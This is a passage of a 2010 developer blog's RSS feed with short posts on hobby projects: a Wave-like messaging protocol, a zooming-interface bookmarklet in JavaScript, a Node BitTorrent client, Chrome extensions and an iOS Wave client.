      <description>&lt;object style=&quot;height: 344px; width: 425px;&quot; classid=&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&quot; width=&quot;100&quot; height=&quot;100&quot; codebase=&quot;http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0&quot;&gt;&lt;param name=&quot;allowFullScreen&quot; value=&quot;true&quot; /&gt;&lt;param name=&quot;allowScriptAccess&quot; value=&quot;always&quot; /&gt;&lt;param name=&quot;src&quot; value=&quot;http://www.youtube.com/v/uJvkUvMALM8?version=3&quot; /&gt;&lt;param name=&quot;allowfullscreen&quot; value=&quot;true&quot; /&gt;&lt;embed style=&quot;height: 344px; width: 425px;&quot; type=&quot;application/x-shockwave-flash&quot; width=&quot;100&quot; height=&quot;100&quot; src=&quot;http://www.youtube.com/v/uJvkUvMALM8?version=3&quot; allowscriptaccess=&quot;always&quot; allowfullscreen=&quot;true&quot;&gt;&lt;/embed&gt;&lt;/object&gt;

&lt;p&gt;In other words. It’s&lt;a href=&quot;http://googleblog.blogspot.com/2010/08/update-on-google-wave.html&quot;&gt; like google wave&lt;/a&gt;, but simpler in every possible way.&lt;/p&gt;
&lt;p&gt;This protocol uses two servers. The federation server and the storage server. The latter is incredably simple. In fact, the reference implementation is only about 200 lines of JS (Node.JS FTW). Thats because a storage server accomplishes just about three things. It receives message deltas. It applies them. And it pushes the delta to all subscribers. The subscribers are the federation servers, they act on the behalf of multiple clients, keeping track of users, their inboxes, etc.&lt;/p&gt;
&lt;p&gt;Anyway, the big part about the design is that there is only one unit of information, and that is the message. There’s no such thing as waves, wavelets, conversations, private replies, threads (sort of lying here), blips and other information. It’s just messages. Messages are stored on storage servers, and are filled with HTML and a tree of information.&lt;/p&gt;
&lt;p&gt;Messages can have other messages inside them. It’s just some xml-ish stuff. &amp;lt;thread&amp;gt;&amp;lt;/thread&amp;gt; is a thread and &amp;lt;message name=”&lt;a href=&quot;http://blahblahblah.com/blahblahblah&amp;quot;&amp;gt;&amp;lt;/message&amp;amp;gt&quot;&gt;http://blahblahblah.com/blahblahblah&amp;quot;&amp;gt;&amp;lt;/message&amp;amp;gt&lt;/a&gt;; is a message that goes inside the thread. You can stick it anywhere. In the middle (inline replies!) or at the end (normal replies!).&lt;/p&gt;
&lt;p&gt;Messages don’t even have to have text. Gadgets are just messages that are slightly different.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://github.com/antimatter15/awesomeness&quot;&gt;http://github.com/antimatter15/awesomeness&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;There’s a lot that it doesn’t do because I’m too lazy to do it. And I can’t give you a live demo because I don’t have a node-enabled server.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>HTML5/CSS3 Zooming User Interface</title>
      <link>http://antimatter15.com/2010/08/html5-css3-zooming-user-interface/</link>
      <pubDate>Sat, 28  Aug 2010 21:39:34 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/08/html5-css3-zooming-user-interface/</guid>
      <author></author>
      <description>&lt;object style=&quot;height: 344px; width: 425px;&quot; classid=&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&quot; width=&quot;100&quot; height=&quot;100&quot; codebase=&quot;http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,40,0&quot;&gt;&lt;param name=&quot;allowFullScreen&quot; value=&quot;true&quot; /&gt;&lt;param name=&quot;allowScriptAccess&quot; value=&quot;always&quot; /&gt;&lt;param name=&quot;src&quot; value=&quot;http://www.youtube.com/v/Zus6yre73Qc?version=3&quot; /&gt;&lt;param name=&quot;allowfullscreen&quot; value=&quot;true&quot; /&gt;&lt;embed style=&quot;height: 344px; width: 425px;&quot; type=&quot;application/x-shockwave-flash&quot; width=&quot;100&quot; height=&quot;100&quot; src=&quot;http://www.youtube.com/v/Zus6yre73Qc?version=3&quot; allowscriptaccess=&quot;always&quot; allowfullscreen=&quot;true&quot;&gt;&lt;/embed&gt;&lt;/object&gt;

&lt;p&gt;I’m taking liberties with the &lt;a href=&quot;http://en.wikipedia.org/wiki/Zooming_user_interface&quot;&gt;concept of zooming user interfaces&lt;/a&gt;, but this is an example of something that lets you browse wikipedia by zooming in toward a link, and zooming out to go back. So I guess it’s more of a z-axis spatial visualization for history somewhat similar to what I guess Apple’s Time Machine program is like (though I have never tried it).&lt;/p&gt;
&lt;p&gt;It uses html5’s popState and pushState to get the URL to change without reloading the page (which, btw people should use instead of the weird /#/ urls). It uses webkit transformations, which probably aren’t part of CSS3 since it’s vendor specific, but I haven’t had time to hack it to work on firefox, &lt;a href=&quot;http://github.com/antimatter15/zui/blob/master/zui.js&quot;&gt;feel free to fork&lt;/a&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='javascript'&gt;&lt;/span&gt;javascript:(&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;{&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; scale=&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;,tx=innerWidth/&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;,ty=innerHeight/&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;,sx=innerWidth/&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;,sy=innerHeight/&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;;&lt;span class=&quot;hljs-built_in&quot;&gt;document&lt;/span&gt;.onmousewheel=&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(a)&lt;/span&gt;&lt;/span&gt;{&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(a.wheelDelta){&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(a.wheelDelta&amp;gt;&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;)scale*=a.wheelDelta/&lt;span class=&quot;hljs-number&quot;&gt;1000&lt;/span&gt;;&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(a.wheelDelta&amp;lt;&lt;span class=&quot;hljs-number&quot;&gt;0&lt;/span&gt;)scale/=-a.wheelDelta/&lt;span class=&quot;hljs-number&quot;&gt;1000&lt;/span&gt;}scale&amp;lt;&lt;span class=&quot;hljs-number&quot;&gt;0.05&lt;/span&gt;&amp;amp;&amp;amp;history.go(-&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;);showTransform();a.preventDefault()};&lt;span class=&quot;hljs-built_in&quot;&gt;window&lt;/span&gt;.onpopstate=&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(a)&lt;/span&gt;&lt;/span&gt;{loadPage(a.state.url)}; &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;showTransform&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;{&lt;span class=&quot;hljs-built_in&quot;&gt;document&lt;/span&gt;.body.style.webkitTransform=&lt;span class=&quot;hljs-string&quot;&gt;&quot;scale(&quot;&lt;/span&gt;+scale+&lt;span class=&quot;hljs-string&quot;&gt;&quot;) translate(&quot;&lt;/span&gt;+(innerWidth/&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;-tx)+&lt;span class=&quot;hljs-string&quot;&gt;&quot;px,&quot;&lt;/span&gt;+(innerHeight/&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;-ty)+&lt;span class=&quot;hljs-string&quot;&gt;&quot;px)&quot;&lt;/span&gt;;&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; a=&lt;span class=&quot;hljs-built_in&quot;&gt;document&lt;/span&gt;.elementFromPoint(innerWidth/&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;,innerHeight/&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;);&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(a.nodeName==&lt;span class=&quot;hljs-string&quot;&gt;&quot;A&quot;&lt;/span&gt;&amp;amp;&amp;amp;a.offsetWidth*scale&amp;gt;&lt;span class=&quot;hljs-number&quot;&gt;0.3&lt;/span&gt;*innerWidth&amp;amp;&amp;amp;a.offsetHeight*scale&amp;gt;&lt;span class=&quot;hljs-number&quot;&gt;0.3&lt;/span&gt;*innerHeight){&lt;span class=&quot;hljs-built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;hljs-string&quot;&gt;&quot;clicky&quot;&lt;/span&gt;);loadPage(a.href);history.pushState({url:a.href},a.href,a.href)}} &lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;hljs-title&quot;&gt;loadPage&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(a)&lt;/span&gt;&lt;/span&gt;{&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; b=&lt;span class=&quot;hljs-keyword&quot;&gt;new&lt;/span&gt; XMLHttpRequest;b.open(&lt;span class=&quot;hljs-string&quot;&gt;&quot;get&quot;&lt;/span&gt;,a,&lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;);b.onload=&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;()&lt;/span&gt;&lt;/span&gt;{&lt;span class=&quot;hljs-built_in&quot;&gt;document&lt;/span&gt;.body.innerHTML=b.responseText;showTransform()};b.send(&lt;span class=&quot;hljs-literal&quot;&gt;null&lt;/span&gt;);scale=&lt;span class=&quot;hljs-number&quot;&gt;1&lt;/span&gt;;tx=innerWidth/&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;;ty=innerHeight/&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;;sx=innerWidth/&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;;sy=innerHeight/&lt;span class=&quot;hljs-number&quot;&gt;2&lt;/span&gt;;showTransform()}&lt;span class=&quot;hljs-keyword&quot;&gt;var&lt;/span&gt; dragging=&lt;span class=&quot;hljs-literal&quot;&gt;false&lt;/span&gt;;&lt;span class=&quot;hljs-built_in&quot;&gt;document&lt;/span&gt;.onmousemove=&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(a)&lt;/span&gt;&lt;/span&gt;{&lt;span class=&quot;hljs-keyword&quot;&gt;if&lt;/span&gt;(dragging){tx+=(sx-a.pageX)/scale;ty+=(sy-a.pageY)/scale;sx=a.pageX;sy=a.pageY;showTransform();a.preventDefault();a.stopPropagation()}}; &lt;span class=&quot;hljs-built_in&quot;&gt;document&lt;/span&gt;.onmousedown=&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(a)&lt;/span&gt;&lt;/span&gt;{dragging=&lt;span class=&quot;hljs-literal&quot;&gt;true&lt;/span&gt;;sx=a.pageX;sy=a.pageY;a.preventDefault()};&lt;span class=&quot;hljs-built_in&quot;&gt;document&lt;/span&gt;.onclick=&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(a)&lt;/span&gt;&lt;/span&gt;{a.preventDefault()};&lt;span class=&quot;hljs-built_in&quot;&gt;document&lt;/span&gt;.onmouseup=&lt;span class=&quot;hljs-function&quot;&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-params&quot;&gt;(a)&lt;/span&gt;&lt;/span&gt;{dragging=&lt;span class=&quot;hljs-literal&quot;&gt;false&lt;/span&gt;;a.preventDefault()};})()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;So that’s a bookmarklet. feel free to click it on this site and it’ll get rid of the infinite scrolling and for some reason it doesn’t work well on this site. Try it on wikipedia.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span style='display:none' detected-language='clojure'&gt;&lt;/span&gt;&lt;span class=&quot;hljs-list&quot;&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;hljs-list&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;hljs-collection&quot;&gt;{
    var scale=1,
        tx=innerWidth/2,
        ty=innerHeight/2,
        sx=innerWidth/2,
        sy=innerHeight/2,
        mx=innerWidth/2,
        my=innerHeight/2,

    document.onmousewheel=function&lt;span class=&quot;hljs-list&quot;&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;a&lt;/span&gt;)&lt;/span&gt;&lt;span class=&quot;hljs-collection&quot;&gt;{
        console.log&lt;span class=&quot;hljs-list&quot;&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;a.wheelDelta&lt;/span&gt;, scale)&lt;/span&gt;
        scale = Math.exp&lt;span class=&quot;hljs-list&quot;&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;Math.log&lt;/span&gt;&lt;span class=&quot;hljs-list&quot;&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;scale&lt;/span&gt;)&lt;/span&gt; + a.wheelDelta / &lt;span class=&quot;hljs-number&quot;&gt;200&lt;/span&gt;)&lt;/span&gt;
        if&lt;span class=&quot;hljs-list&quot;&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;scale&amp;lt;0.05&lt;/span&gt;)&lt;/span&gt; history.go&lt;span class=&quot;hljs-list&quot;&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;-1&lt;/span&gt;)&lt;/span&gt;&lt;span class=&quot;hljs-comment&quot;&gt;;&lt;/span&gt;
        showTransform&lt;span class=&quot;hljs-list&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;hljs-comment&quot;&gt;;&lt;/span&gt;
        a.preventDefault&lt;span class=&quot;hljs-list&quot;&gt;()&lt;/span&gt;
    }&lt;/span&gt;&lt;span class=&quot;hljs-comment&quot;&gt;;&lt;/span&gt;
    window.onpopstate=function&lt;span class=&quot;hljs-list&quot;&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;a&lt;/span&gt;)&lt;/span&gt;&lt;span class=&quot;hljs-collection&quot;&gt;{
        loadPage&lt;span class=&quot;hljs-list&quot;&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;a.state.url&lt;/span&gt;)&lt;/span&gt;
    }&lt;/span&gt;&lt;span class=&quot;hljs-comment&quot;&gt;;&lt;/span&gt;
    function showTransform&lt;span class=&quot;hljs-list&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;hljs-collection&quot;&gt;{
        document.body.style.webkitTransform=&lt;span class=&quot;hljs-string&quot;&gt;&quot;scale(&quot;&lt;/span&gt;+scale+&lt;span class=&quot;hljs-string&quot;&gt;&quot;) translate(&quot;&lt;/span&gt;+&lt;span class=&quot;hljs-list&quot;&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;mx-tx&lt;/span&gt;)&lt;/span&gt;+&lt;span class=&quot;hljs-string&quot;&gt;&quot;px,&quot;&lt;/span&gt;+&lt;span class=&quot;hljs-list&quot;&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;my-ty&lt;/span&gt;)&lt;/span&gt;+&lt;span class=&quot;hljs-string&quot;&gt;&quot;px)&quot;&lt;/span&gt;&lt;span class=&quot;hljs-comment&quot;&gt;;&lt;/span&gt;
        var a=document.elementFromPoint&lt;span class=&quot;hljs-list&quot;&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;innerWidth/2&lt;/span&gt;,innerHeight/2)&lt;/span&gt;&lt;span class=&quot;hljs-comment&quot;&gt;;&lt;/span&gt;
        if&lt;span class=&quot;hljs-list&quot;&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;a.nodeName==&lt;/span&gt;&lt;span class=&quot;hljs-string&quot;&gt;&quot;A&quot;&lt;/span&gt;&amp;amp;&amp;amp;a.offsetWidth*scale&amp;gt;0.3*innerWidth&amp;amp;&amp;amp;a.offsetHeight*scale&amp;gt;0.3*innerHeight)&lt;/span&gt;&lt;span class=&quot;hljs-collection&quot;&gt;{
            console.log&lt;span class=&quot;hljs-list&quot;&gt;(&lt;span class=&quot;hljs-string&quot;&gt;&quot;clicky&quot;&lt;/span&gt;)&lt;/span&gt;&lt;span class=&quot;hljs-comment&quot;&gt;;&lt;/span&gt;
            loadPage&lt;span class=&quot;hljs-list&quot;&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;a.href&lt;/span&gt;)&lt;/span&gt;&lt;span class=&quot;hljs-comment&quot;&gt;;&lt;/span&gt;
            history.pushState&lt;span class=&quot;hljs-list&quot;&gt;(&lt;span class=&quot;hljs-collection&quot;&gt;{url:a.href}&lt;/span&gt;,a.href,a.href)&lt;/span&gt;
        }&lt;/span&gt;
    }&lt;/span&gt; 
    function loadPage&lt;span class=&quot;hljs-list&quot;&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;a&lt;/span&gt;)&lt;/span&gt;&lt;span class=&quot;hljs-collection&quot;&gt;{
        var b=new XMLHttpRequest;
        b.open&lt;span class=&quot;hljs-list&quot;&gt;(&lt;span class=&quot;hljs-string&quot;&gt;&quot;get&quot;&lt;/span&gt;,a,true)&lt;/span&gt;&lt;span class=&quot;hljs-comment&quot;&gt;;&lt;/span&gt;
        b.onload=function&lt;span class=&quot;hljs-list&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;hljs-collection&quot;&gt;{
            document.body.innerHTML=b.responseText;
            showTransform&lt;span class=&quot;hljs-list&quot;&gt;()&lt;/span&gt;
        }&lt;/span&gt;&lt;span class=&quot;hljs-comment&quot;&gt;;&lt;/span&gt;
        b.send&lt;span class=&quot;hljs-list&quot;&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;null&lt;/span&gt;)&lt;/span&gt;&lt;span class=&quot;hljs-comment&quot;&gt;;&lt;/span&gt;
        scale=1;
        tx=innerWidth/2;
        ty=innerHeight/2;
        sx=innerWidth/2;
        sy=innerHeight/2;
        showTransform&lt;span class=&quot;hljs-list&quot;&gt;()&lt;/span&gt;
    }&lt;/span&gt;
    var dragging=false;
    document.onmousemove=function&lt;span class=&quot;hljs-list&quot;&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;a&lt;/span&gt;)&lt;/span&gt;&lt;span class=&quot;hljs-collection&quot;&gt;{

        if&lt;span class=&quot;hljs-list&quot;&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;dragging&lt;/span&gt;)&lt;/span&gt;&lt;span class=&quot;hljs-collection&quot;&gt;{
            tx+=&lt;span class=&quot;hljs-list&quot;&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;sx-a.pageX&lt;/span&gt;)&lt;/span&gt;/scale;
            ty+=&lt;span class=&quot;hljs-list&quot;&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;sy-a.pageY&lt;/span&gt;)&lt;/span&gt;/scale;
            sx=a.pageX;
            sy=a.pageY;
            showTransform&lt;span class=&quot;hljs-list&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;hljs-comment&quot;&gt;;&lt;/span&gt;
            a.preventDefault&lt;span class=&quot;hljs-list&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;hljs-comment&quot;&gt;;&lt;/span&gt;
            a.stopPropagation&lt;span class=&quot;hljs-list&quot;&gt;()&lt;/span&gt;
        }&lt;/span&gt;
    }&lt;/span&gt;&lt;span class=&quot;hljs-comment&quot;&gt;; &lt;/span&gt;
    document.onmousedown=function&lt;span class=&quot;hljs-list&quot;&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;a&lt;/span&gt;)&lt;/span&gt;&lt;span class=&quot;hljs-collection&quot;&gt;{
        dragging=true;
        sx=a.pageX;
        sy=a.pageY;
        a.preventDefault&lt;span class=&quot;hljs-list&quot;&gt;()&lt;/span&gt;
    }&lt;/span&gt;&lt;span class=&quot;hljs-comment&quot;&gt;;&lt;/span&gt;
    document.onclick=function&lt;span class=&quot;hljs-list&quot;&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;a&lt;/span&gt;)&lt;/span&gt;&lt;span class=&quot;hljs-collection&quot;&gt;{
        a.preventDefault&lt;span class=&quot;hljs-list&quot;&gt;()&lt;/span&gt;
    }&lt;/span&gt;&lt;span class=&quot;hljs-comment&quot;&gt;;&lt;/span&gt;
    document.onmouseup=function&lt;span class=&quot;hljs-list&quot;&gt;(&lt;span class=&quot;hljs-keyword&quot;&gt;a&lt;/span&gt;)&lt;/span&gt;&lt;span class=&quot;hljs-collection&quot;&gt;{
        dragging=false;
        a.preventDefault&lt;span class=&quot;hljs-list&quot;&gt;()&lt;/span&gt;
    }&lt;/span&gt;&lt;span class=&quot;hljs-comment&quot;&gt;;&lt;/span&gt;
}&lt;/span&gt;)&lt;/span&gt;&lt;span class=&quot;hljs-list&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>BitTorrent in JavaScript with Node</title>
      <link>http://antimatter15.com/2010/08/bittorrent-in-javascript-with-node/</link>
      <pubDate>Sat, 28  Aug 2010 21:26:21 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/08/bittorrent-in-javascript-with-node/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2010/BitTorrent%20in%20JavaScript%20with%20Node/Screenshot-41.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/BitTorrent%20in%20JavaScript%20with%20Node/Screenshot-41.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screenshot-4&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;A few months ago&lt;a href=&quot;http://github.com/antimatter15/jstorrent&quot;&gt; I tried to make a bittorrent client in javascript&lt;/a&gt;. But a few days after it started, I found out that there were already other projects with the same goal. The most complete of them was summerTorrent. However, though (I thought) it was so insanely close, it wasn’t finished. So anyway, I made a few changes that at least made basic torrenting functionality working.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://github.com/antimatter15/summerTorrent&quot;&gt;summerTorrent&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Chrome Extension Desktop Search</title>
      <link>http://antimatter15.com/2010/08/chrome-extension-desktop-search/</link>
      <pubDate>Sat, 28  Aug 2010 21:15:06 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/08/chrome-extension-desktop-search/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2010/Chrome%20Extension%20Desktop%20Search/Screenshot-2.png&quot;&gt;
&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/Chrome%20Extension%20Desktop%20Search/Screenshot-2.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screenshot-2&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/articles/2010/Chrome%20Extension%20Desktop%20Search/edit-find128.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/Chrome%20Extension%20Desktop%20Search/edit-find128.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;edit-find128&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;I felt like making some chrome extensions recently. so this is a almost totally useless one, since it uses the experimental APIs. Basically, since the new versions of chrome let you have content scripts that act off file:/// urls, you can make a script that indexes the local files and store it to a searchable index, as I have done. Plus, there’s a new omnibox api, so you can use that to search too.&lt;/p&gt;
&lt;p&gt;Probably won’t work for anyone. but anyway, feel free to&lt;a href=&quot;http://github.com/antimatter15/chromesearch&quot;&gt; fork it on github.&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Chrome Extension Hide Element</title>
      <link>http://antimatter15.com/2010/08/chrome-extension-hide-element/</link>
      <pubDate>Sat, 28  Aug 2010 21:09:49 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/08/chrome-extension-hide-element/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;/articles/2010/Chrome%20Extension%20Hide%20Element/edit-delete512.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/Chrome%20Extension%20Hide%20Element/edit-delete512.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;edit-delete512&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;a href=&quot;/articles/2010/Chrome%20Extension%20Hide%20Element/Screenshot-4.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/Chrome%20Extension%20Hide%20Element/Screenshot-4.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screenshot-4&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://chrome.google.com/extensions/detail/omjoegfimgdcgigodfpnjefanhfiagae&quot;&gt;https://chrome.google.com/extensions/detail/omjoegfimgdcgigodfpnjefanhfiagae&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;It’s a simple extension that uses the new chrome context menu API to gain DOM access to hide an element. It’s actually a lot more complicated than it should be since, probably chrome’s multi-process architecture makes it impossible to actually pass the DOM over, so instead you have to create a content script that listens and logs all click events and when a context menu action is triggered, you send a message to the content script which applies an action to the selected DOM node.&lt;/p&gt;
&lt;p&gt;Anyway. Code here. &lt;a href=&quot;http://github.com/antimatter15/hideelements&quot;&gt;http://github.com/antimatter15/hideelements&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>microwave on app store</title>
      <link>http://antimatter15.com/2010/08/microwave-on-app-store/</link>
      <pubDate>Mon, 23  Aug 2010 03:48:53 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/08/microwave-on-app-store/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;http://itunes.apple.com/us/app/microwave-google-wave-client/id386081118?mt=8&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/microwave%20on%20app%20store/Screenshot-3.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;microwave app store&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://itunes.apple.com/us/app/microwave-google-wave-client/id386081118?mt=8&quot;&gt;http://itunes.apple.com/us/app/microwave-google-wave-client/id386081118?mt=8&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;So microwave is now on the app store. Though wave was just announced to be shut down, I had the app done already (though I was waiting for a wave server update so thread continuation and attachment uploading would work), and I just published it anyway&lt;a href=&quot;http://itunes.apple.com/us/app/microwave-google-wave-client/id386081118?mt=8&quot;&gt;. So here it is. Grab it while wave still works :).&lt;/a&gt; It supports offline, so you can cache some waves and read them on-the-go.&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Deep Integration Wave API Sample Blogger</title>
      <link>http://antimatter15.com/2010/08/deep-integration-wave-api-sample-blogger/</link>
      <pubDate>Fri, 06  Aug 2010 00:12:22 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/08/deep-integration-wave-api-sample-blogger/</guid>
      <author></author>
      <description>&lt;p&gt;&lt;a href=&quot;http://w2embedtest.blogspot.com/2010/08/intense.html&quot;&gt;http://w2embedtest.blogspot.com/2010/08/intense.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://w2embedtest.blogspot.com/2010/08/intense.html&quot;&gt;&lt;/a&gt;&lt;a href=&quot;/articles/2010/Deep%20Integration%20Wave%20API%20Sample%20Blogger/Screenshot-1.png&quot;&gt;&lt;div class=&quot;pic md&quot; style=&quot;&quot; &gt;&lt;img alt=&quot;&quot;  src=&quot;/articles/2010/Deep%20Integration%20Wave%20API%20Sample%20Blogger/Screenshot-1.png&quot; &gt;&lt;div class=&quot;caption&quot;&gt;Screenshot-1&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;It’s not just one post, it’s the whole blog! &lt;a href=&quot;http://w2embedtest.blogspot.com/&quot;&gt;http://w2embedtest.blogspot.com/&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>1k JS 3d Function Plotter</title>
      <link>http://antimatter15.com/2010/08/1k-js-3d-function-plotter/</link>
      <pubDate>Thu, 05  Aug 2010 21:38:08 -0400</pubDate>
      <guid isPermaLink="true">http://antimatter15.com/2010/08/1k-js-3d-function-plotter/</guid>
      <author></author>
